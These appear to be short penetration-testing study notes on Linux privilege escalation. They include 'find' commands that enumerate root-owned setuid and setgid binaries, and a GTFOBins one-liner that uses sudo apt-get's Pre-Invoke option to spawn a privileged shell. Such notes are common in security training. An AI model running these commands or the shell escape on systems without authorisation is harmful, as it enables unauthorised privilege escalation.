setuid permission can allow a user to execute a program or script with the permission of another user, typically with elevated privileges (appears as an s)

**setuid files
```shell-session
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
- Reverse engineer the program with the SETUID bit set, identify a vulnerability, and exploit this to escalate our privileges

**Enumerate setgid files
```shell-session
find / -uid 0 -perm -6000 -type f 2>/dev/null
```

**setgid files
```shell-session
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```
- Allows us to run binaries as if we were part of the group that created them

**GTFOBins
```shell-session
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```
